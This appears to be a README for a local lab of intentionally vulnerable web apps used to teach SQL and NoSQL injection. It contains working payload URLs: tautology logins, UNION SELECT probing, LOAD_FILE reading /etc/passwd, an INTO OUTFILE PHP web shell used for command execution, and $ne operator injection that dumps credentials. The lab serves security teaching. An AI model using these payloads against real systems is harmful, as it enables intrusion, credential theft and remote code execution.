# Start

Start the network with `./start_linux_network.sh`. You have to wait a bit until the databases are populated.

# SQL

## Overview

To get an overview of the examples goto http://127.0.0.1:8781/

# Listing Example

## Standard query

[http://127.0.0.1:8781/inf_disclosure/specific_table/list_products.php?value=100](http://127.0.0.1:8781/inf_disclosure/specific_table/list_products.php?value=100)

## Attack

### Verification

Error when calling this url:

[http://127.0.0.1:8781/inf_disclosure/specific_table/list_products.php?value=100%27](http://127.0.0.1:8781/inf_disclosure/specific_table/list_products.php?value=100%27)

### List all products

[http://127.0.0.1:8781/inf_disclosure/specific_table/list_products.php?value=100' OR '1'='1](http://127.0.0.1:8781/inf_disclosure/specific_table/list_products.php?value=100'+OR+'1'='1)

# Login Example

## Standard

[http://127.0.0.1:8781/login/login.php](http://127.0.0.1:8781/login/login.php)

Enter 'admin', 'admin'

## Attack

### Verification

Enter some credentials. Check url.

Error when calling this url:

[http://127.0.0.1:8781/login/login.php?user=user'&password=pass'](http://127.0.0.1:8781/login/login.php?user=user'&password=pass')

### Circumvent Login

[http://127.0.0.1:8781/login/login.php?user=admin&password=xyz' OR '1'='1](http://127.0.0.1:8781/login/login.php?user=admin&password=xyz'+OR+'1'='1)

# File Attacks

## Standard

[http://127.0.0.1:8781/load_file/list_users.php?UserID=2](http://127.0.0.1:8781/load_file/list_users.php?UserID=2)

## Verification

Check if you can do a [`UNION SELECT`](https://www.techonthenet.com/sql/union_all.php) (add numbers at the end of the line until the query works 1, then 1,2, then 1,2,3 and s forth...):

[http://127.0.0.1:8781/load_file/list_users.php?UserID=1 UNION ALL SELECT 1,2,3](http://127.0.0.1:8781/load_file/list_users.php?UserID=1+UNION+ALL+SELECT+1,2,3)

## Read sensible files

If file permissions are set to db user (e.g. logged in as root or `GRANT FILE ON *.* TO 'user'@'%';` is set):

Use `LOAD_FILE`:

http://127.0.0.1:8781/load_file/list_users.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3

`http://127.0.0.1:8781/load_file/list_users.php?UserID=1 UNION ALL SELECT LOAD_FILE('/etc/passwd/'),2,3`

## Write code to server

Using LAMP Server:

### Standard

[http://127.0.0.1:8782/into_outfile/list_users.php?UserID=2](http://127.0.0.1:8782/into_outfile/list_users.php?UserID=2)

### Attack

Use `INTO OUTFILE`:

http://127.0.0.1:8782/into_outfile/list_users.php?UserID=2%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27

`/var/www/html/cmd.php` should not exist before.

After that you can check remote code execution with:

http://127.0.0.1:8782/cmd.php?cmd=ls

# Generic Attack

## Standard

[http://127.0.0.1:8781/inf_disclosure/generic/show_timesheet.php](http://127.0.0.1:8781/inf_disclosure/generic/show_timesheet.php)

## Attack

[http://127.0.0.1:8781/inf_disclosure/generic/show_employee_table.php?column1=AdminRights&column2=User&column3=Password&table=Users](http://127.0.0.1:8781/inf_disclosure/generic/show_employee_table.php?column1=AdminRights&column2=User&column3=Password&table=Users)

# Form Skip Attack

## Standard

[http://127.0.0.1:8781/inf_disclosure/form_steps/forms.php](http://127.0.0.1:8781/inf_disclosure/form_steps/forms.php)

Form to choose a customer showing soft skills

## Verification

[http://127.0.0.1:8781/inf_disclosure/form_steps/forms.php?form=form2&param='](http://127.0.0.1:8781/inf_disclosure/form_steps/forms.php?form=form2&param=')

# NoSQL

To get an overview of the examples goto http://127.0.0.1:8782/

## Get all products

- [http://127.0.0.1:8782/products.php?product[$gt]=%22%22](http://127.0.0.1:8782/products.php?product[$gt]=%22%22)
- [http://127.0.0.1:8782/products.php?product[$ne]=1](http://127.0.0.1:8782/products.php?product[$ne]=1)

## Get all credentials / Potential login bypass

- [http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1](http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1)
